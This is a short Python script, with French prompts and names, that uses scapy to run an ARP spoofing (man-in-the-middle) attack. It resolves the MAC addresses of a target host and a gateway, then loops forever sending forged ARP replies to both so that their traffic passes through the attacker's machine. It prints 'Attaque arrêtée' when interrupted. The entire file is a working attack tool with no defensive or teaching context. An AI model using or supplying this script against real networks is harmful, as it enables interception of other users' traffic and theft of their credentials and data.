from scapy.all import ARP, Ether, sendp, sr1
from time import sleep

def adresse_Mac(ip):
    packet_arp = ARP(pdst=ip)
    arp_response = sr1(packet_arp, timeout=1, verbose=False)
    if arp_response:
        mac_address = arp_response.hwsrc
        return mac_address

def Redirection_packet_Arp():

    arp_packet1 = Ether(dst=MAC_passerelle)/ARP(psrc=IP_Cible, pdst=IP_Passerelle, hwsrc=ad_Mac)
    arp_packet2 = Ether(dst=MAC_Cible)/ARP(psrc=IP_Passerelle, pdst=IP_Cible, hwsrc= ad_Mac)
    sendp([arp_packet1, arp_packet2], iface="Wi-Fi", count=1)  
    sleep(5)  

if __name__ == '__main__':
    IP_Cible = str(input("Entrer l'IP Cible : "))
    IP_Passerelle = str(input("Entrer l'IP de la passerelle : "))
    ad_Mac = str(input("Entrer votre adresse MAC"))
    MAC_Cible = adresse_Mac(IP_Cible) 
    MAC_passerelle = adresse_Mac(IP_Passerelle)
    try:
        while True:
            Redirection_packet_Arp()
    except KeyboardInterrupt:
        print("Attaque arrêtée")